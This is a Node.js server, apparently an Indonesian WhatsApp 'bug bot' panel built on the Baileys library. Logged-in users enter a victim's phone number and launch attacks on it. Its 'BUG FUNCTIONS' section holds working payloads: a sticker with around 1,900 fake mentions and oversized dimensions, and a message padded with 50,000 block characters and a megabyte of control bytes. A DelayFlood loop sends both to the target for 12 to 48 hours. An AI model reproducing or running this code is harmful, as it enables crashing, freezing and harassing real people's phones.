const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const config = require("./Database/config.js");
const axios = require("axios");
const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const {
default: makeWASocket,
useMultiFileAuthState,
DisconnectReason,
fetchLatestWaWebVersion
} = require("@whiskeysockets/baileys");

const { tokens, owner: OwnerId, ipvps: VPS, port: PORT } = config;
const cors = require("cors");
const app = express();

app.use(cors());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.json());
app.use(cookieParser());

const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";

let sock;

// ==================== SENDER MANAGER (VIA WEB) ====================
let senderData = null; 
const SENDER_FILE = "./sender.json";
const SENDER_LIFETIME_MS = 24 * 60 * 60 * 1000;

function loadSender() {
  if (fs.existsSync(SENDER_FILE)) {
    try {
      senderData = JSON.parse(fs.readFileSync(SENDER_FILE));
      if (senderData && senderData.expiryTime <= Date.now()) {
        senderData = null;
        saveSender();
      }
      return senderData;
    } catch(e) {
      senderData = null;
      return null;
    }
  }
  senderData = null;
  return null;
}

function saveSender() {
  fs.writeFileSync(SENDER_FILE, JSON.stringify(senderData, null, 2));
}

function setSender(number) {
  senderData = {
    number: number,
    expiryTime: Date.now() + SENDER_LIFETIME_MS
  };
  saveSender();
  return senderData;
}

function removeSender() {
  senderData = null;
  saveSender();
}

function getSender() {
  if (senderData && senderData.expiryTime <= Date.now()) {
    senderData = null;
    saveSender();
  }
  return senderData;
}

loadSender();

// ==================== USER MANAGER ====================
const userFile = "./Database/user.json";

function getUsers() {
  if (!fs.existsSync(userFile)) return [];
  try {
    return JSON.parse(fs.readFileSync(userFile, "utf-8"));
  } catch (err) {
    return [];
  }
}

// ==================== API SENDER ====================
app.get("/api/sender", (req, res) => {
  const sender = getSender();
  res.json({
    active: sender !== null,
    number: sender ? sender.number : null,
    expiryTime: sender ? sender.expiryTime : null
  });
});

app.post("/api/sender/add", (req, res) => {
  const { number } = req.body;
  
  if (!number || !/^\d+$/.test(number)) {
    return res.status(400).json({ error: "Nomor tidak valid!" });
  }
  
  const result = setSender(number);
  res.json({ 
    success: true, 
    message: `Sender ${number} berhasil ditambahkan!`,
    sender: result
  });
});

app.post("/api/sender/remove", (req, res) => {
  removeSender();
  res.json({ success: true, message: "Sender berhasil dihapus!" });
});

// ==================== WHATSAPP FUNCTIONS ====================

const saveActive = (BotNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(BotNumber)) {
    fs.writeFileSync(file_session, JSON.stringify([...list, BotNumber]));
  }
};

const sessionPath = (BotNumber) => {
  const dir = path.join(sessions_dir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  for (const BotNumber of activeNumbers) {
    const sessionDir = sessionPath(BotNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestWaWebVersion();
    sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
    });
    await new Promise((resolve) => {
      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        if (connection === "open") {
          console.log(`✅ Bot ${BotNumber} terhubung!`);
          sessions.set(BotNumber, sock);
          return resolve();
        }
        if (connection === "close") {
          const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
          if (shouldReconnect) {
            await initializeWhatsAppConnections();
          }
        }
      });
      sock.ev.on("creds.update", saveCreds);
    });
  }
};

// ==================== BUG FUNCTIONS ====================

async function SendBlank(target) {
  const msg = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      fileLength: 12260,
      mediaKeyTimestamp: "1743832131",
      isAnimated: false,
      stickerSentTs: "X",
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"),
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", msg, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });
}

async function SuperBlank(target) {
  const msg = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "⚠️" + "⬛".repeat(50000), 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_message"
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", msg, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function DelayFlood(durationHours, target) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
      console.log(`✅ Selesai! Total: ${count} dikirim`);
      return;
    }

    try {
      await Promise.all([
        SendBlank(target),
        SuperBlank(target),
        sleep(300)
      ]);
      count++;
      console.log(chalk.yellow(`[${count}] Blank sent to ${target}`));
      setTimeout(sendNext, 700);
    } catch (error) {
      console.error(`❌ Error: ${error.message}`);
      setTimeout(sendNext, 1500);
    }
  };
  sendNext();
}

// ==================== WEB ROUTES ====================

app.get("/", (req, res) => {
  const filePath = path.join(__dirname, "AppsVerse", "login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca login.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const msg = req.query.msg || "";
  const filePath = path.join(__dirname, "AppsVerse", "login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca file login.html");
    res.send(html);
  });
});

app.post("/auth", (req, res) => {
  const { username, key } = req.body;
  const users = getUsers();

  const user = users.find(u => u.username === username && u.key === key);
  if (!user) {
    return res.redirect("/login?msg=" + encodeURIComponent("Username atau Key salah!"));
  }

  res.cookie("sessionUser", username, { maxAge: 60 * 60 * 1000 });
  res.cookie("sessionKey", key, { maxAge: 60 * 60 * 1000 });
  res.redirect("/execution");
});

let lastExecution = 0;

app.get("/execution", (req, res) => {
  const username = req.cookies.sessionUser;
  
  if (!username) {
    return res.redirect("/login");
  }

  const targetNumber = req.query.target;
  const mode = req.query.mode;
  const justExecuted = req.query.justExecuted === 'true';

  if (justExecuted) {
    const versePath = path.join(__dirname, "AppsVerse", "Verse.html");
    fs.readFile(versePath, "utf8", (err, html) => {
      if (err) return res.status(500).send("❌ Gagal baca Verse.html");
      res.send(html);
    });
    return;
  }

  if (!targetNumber || !mode) {
    const versePath = path.join(__dirname, "AppsVerse", "Verse.html");
    fs.readFile(versePath, "utf8", (err, html) => {
      if (err) return res.status(500).send("❌ Gagal baca Verse.html");
      res.send(html);
    });
    return;
  }

  // Validasi nomor
  if (!/^\d+$/.test(targetNumber)) {
    const versePath = path.join(__dirname, "AppsVerse", "Verse.html");
    fs.readFile(versePath, "utf8", (err, html) => {
      if (err) return res.status(500).send("❌ Gagal baca Verse.html");
      res.send(html);
    });
    return;
  }

  // Cek sender aktif
  const sender = getSender();
  if (!sender) {
    const versePath = path.join(__dirname, "AppsVerse", "Verse.html");
    fs.readFile(versePath, "utf8", (err, html) => {
      if (err) return res.status(500).send("❌ Gagal baca Verse.html");
      res.send(html);
    });
    return;
  }

  // Jalankan bug
  const target = `${targetNumber}@s.whatsapp.net`;
  
  try {
    console.log(`🔥 ${chalk.green('EXECUTING')} ${mode} to ${targetNumber} via ${sender.number}`);
    
    if (mode === "delay") {
      DelayFlood(24, target);
    } else if (mode === "blank") {
      DelayFlood(48, target);
    } else {
      DelayFlood(12, target);
    }
    
    lastExecution = Date.now();
    
    res.redirect(`/execution?justExecuted=true&target=${targetNumber}&mode=${mode}`);
  } catch (err) {
    console.error("❌ Error:", err.message);
    const versePath = path.join(__dirname, "AppsVerse", "Verse.html");
    fs.readFile(versePath, "utf8", (err2, html) => {
      if (err2) return res.status(500).send("❌ Gagal baca Verse.html");
      res.send(html);
    });
  }
});

app.get("/logout", (req, res) => {
  res.clearCookie("sessionUser");
  res.clearCookie("sessionKey");
  res.redirect("/login");
});

// ==================== START ====================

initializeWhatsAppConnections();

app.listen(PORT, '0.0.0.0', () => {
  console.log(`✅ Server running on port ${PORT}`);
  console.log(`✅ Domain: https://onyxcore-production.up.railway.app`);
  console.log(`✅ Sender aktif: ${getSender() ? getSender().number : 'Belum ada'}`);
});

process.on('uncaughtException', (err) => {
  console.error('❌ Uncaught Exception:', err.message);
});

process.on('unhandledRejection', (err) => {
  console.error('❌ Unhandled Rejection:', err.message);
});

module.exports = { getUsers };